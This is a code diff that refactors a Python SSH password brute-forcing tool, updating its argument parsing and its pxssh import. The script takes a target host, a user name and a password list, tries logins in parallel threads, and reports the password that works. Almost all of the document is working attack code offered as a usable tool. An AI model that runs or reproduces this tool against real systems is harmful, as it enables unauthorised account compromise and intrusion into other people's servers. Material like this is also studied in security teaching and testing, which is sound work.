@@ -1,27 +1,27 @@
 ''' brute force passwords for ssh'''
-import pxssh
-import optparse
+import argparse
+import sys
 import time
 import threading
-#from threading import *
+from pexpect import pxssh
 
-maxConnections = 5
-connection_lock = BoundedSemaphore(value=maxConnections)
-Found = False
-Fails = 0
+MAX_CONNECTIONS = 5
+connection_lock = threading.BoundedSemaphore(value=MAX_CONNECTIONS)
+FOUND = False
+FAILS = 0
 
 def connect(host, user, password, release):
     ''' connect to ssh'''
-    global Found
-    global Fails
+    global FOUND
+    global FAILS
     try:
         s = pxssh.pxssh()
         s.login(host, user, password)
-        print('[+] Password Found: ' + password)
-        Found = True
+        print('[+] Password FOUND: ' + password)
+        FOUND = True
     except Exception as e:
         if 'read_nonblocking' in str(e):
-            Fails += 1
+            FAILS += 1
             time.sleep(5)
             connect(host, user, password, False)
         elif 'synchronize with original prompt' in str(e):
@@ -33,32 +33,37 @@ def connect(host, user, password, release):
 
 def main():
     ''' main function'''
-    parser = optparse.OptionParser('usage%prog -H <target host> -u <user> -F <password list>')
-    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
-    parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
-    parser.add_option('-u', dest='user', type='string', help='specify the user')
-    (options, args) = parser.parse_args()
-    host = options.tgtHost
-    passwdFile = options.passwdFile
-    user = options.user
-    if host is None or passwdFile is None or user is None:
-        print(parser.usage)
-        exit(0)
-    fn = open(passwdFile, 'r')
-    for line in fn.readlines():
-        if Found:
-            print('[*] Exiting: Password Found')
-            exit(0)
-        if Fails > 5:
-            print('[!] Exiting: Too Many Socket Timeouts')
-            exit(0)
-        connection_lock.acquire()
-        password = line.strip('\r').strip('\n')
-        print('[-] Testing: ' + str(password))
-        t = threading.Thread(target=connect, args=(host, user, password, True))
-        child = t.start()
-        
-if __name__ == '__main__':
-    main()
+    parser = argparse.ArgumentParser(usage='ssh_brute.py -H TARGET_HOST -u TARGET_USER -F PASSWORD_FILE')
+    parser.add_argument('-H', metavar='TARGET_HOST', type=str, help='specify target host')
+    parser.add_argument('-u', metavar='TARGET_USER', type=str, help='specify the user')
+    parser.add_argument('-F', metavar='PASSWORD_FILE', type=str, help='specify password file')
+    args = parser.parse_args()
 
+    if args.u is None or args.H is None or args.F is None:
+        print("[-] You must specify a target host and user and password file.")
+        print(parser.usage)
+        sys.exit(0)
+
+    host = str(args.H)
+    passwdFile = str(args.F)
+    user = str(args.u)
+
+    with open(passwdFile, 'r', encoding='utf-8-sig') as fn:
+        for line in fn.readlines():
+            if FOUND:
+                print('[*] Exiting: Password FOUND')
+                sys.exit(0)
+            if FAILS > 5:
+                print('[!] Exiting: Too Many Socket Timeouts')
+                sys.exit(0)
+            connection_lock.acquire()
+            password = line.strip('\r').strip('\n')
+            print('[-] Testing: ' + str(password))
+            t = threading.Thread(target=connect, args=(host, user, password, True))
+            t.start()
+
+if __name__ == '__main__':
+    print('[+] SSH Brute Force Tool starting')
+    main()
+    print('[+] SSH Brute Force Tool finished')
         
